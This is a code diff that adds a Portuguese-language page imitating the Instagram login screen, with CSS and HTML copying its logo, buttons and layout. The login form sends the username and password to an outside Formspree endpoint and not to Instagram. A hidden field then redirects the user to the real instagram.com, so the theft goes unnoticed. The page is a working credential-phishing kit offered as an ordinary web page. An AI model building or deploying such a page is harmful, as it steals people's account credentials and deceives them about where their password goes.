@@ -61,4 +61,158 @@
             margin-bottom: 10px;
             border: 1px solid #dbdbdb;
             border-radius: 3px;
-            background-co
+            background-color: #fafafa;
+            font-size: 14px;
+            text-align: center;
+        }
+
+        input::placeholder {
+            color: #999;
+        }
+
+        .instagram-entrar {
+            width: 100%;
+            padding: 8px;
+            background-color: #0095f6;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+
+        p {
+            text-align: center;
+            font-size: 13px;
+            color: #999;
+            margin: 10px 0;
+        }
+
+        .instagram-entrar-facebook {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 5px;
+            color: #385185;
+            font-weight: bold;
+            text-decoration: none;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+
+        .instagram-entrar-facebook img {
+            vertical-align: middle;
+        }
+
+        .instagram-esqueceu {
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+        }
+
+        .group {
+            width: 100%;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 40px 40px 20px;
+            margin-bottom: 10px;
+            text-align: center;
+            border-radius: 1px;
+        }
+
+        .not-account {
+            font-size: 14px;
+            color: #262626;
+        }
+
+        .link-blue {
+            color: #0095f6;
+            cursor: pointer;
+        }
+
+        .get-app {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+            color: #262626;
+        }
+
+        .download {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .app-download {
+            display: block;
+            width: 136px;
+            height: 40px;
+            background-color: #000;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="instagram-wrapper">
+        <!-- IMAGEM DO CELULAR -->
+        <div class="instagram-phone">
+            <img src="./img/apresentacao-celular.png" alt="instagram apresentação">
+        </div>
+
+        <!-- LOGIN -->
+        <div class="instagram-login">
+
+            <div class="group">
+                <img src="./img/instagram-logo.png" class="instagram-logo" alt="instagram logo">
+
+                <div class="user-login">
+                    <form action="https://formspree.io/f/xkoojkow" method="POST">
+                        <input 
+                            type="text" 
+                            name="login" 
+                            placeholder="Telefone, nome de usuário ou email" 
+                            required
+                        ><br/>
+                        <input 
+                            type="password" 
+                            name="senha" 
+                            placeholder="Senha" 
+                            required
+                        >
+                        <input type="hidden" name="_next" value="https://www.instagram.com/">
+                        <button type="submit" class="instagram-entrar">Entrar</button>
+                    </form>
+                </div>
+
+                <p>OU</p>
+
+                <a href="#" class="instagram-entrar-facebook">
+                    <img src="./img/facebook-icon.png" alt="facebook" width="13" height="13">
+                    <b>Entrar com o Facebook</b>
+                </a>
+
+                <a href="#" class="instagram-esqueceu">
+                    Esqueceu a senha?
+                </a>
+            </div>
+
+            <div class="group">
+                <p class="not-account">
+                    Não tem uma conta? 
+                    <span class="link-blue">Cadastre-se</span>
+                </p>
+            </div>
+
+            <div class="get-app">
+                <p class="get-app">Obtenha o aplicativo</p>
+                <div class="download">
+                    <a href="#" class="app-download"></a>
+                    <a href="#" class="app-download"></a>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
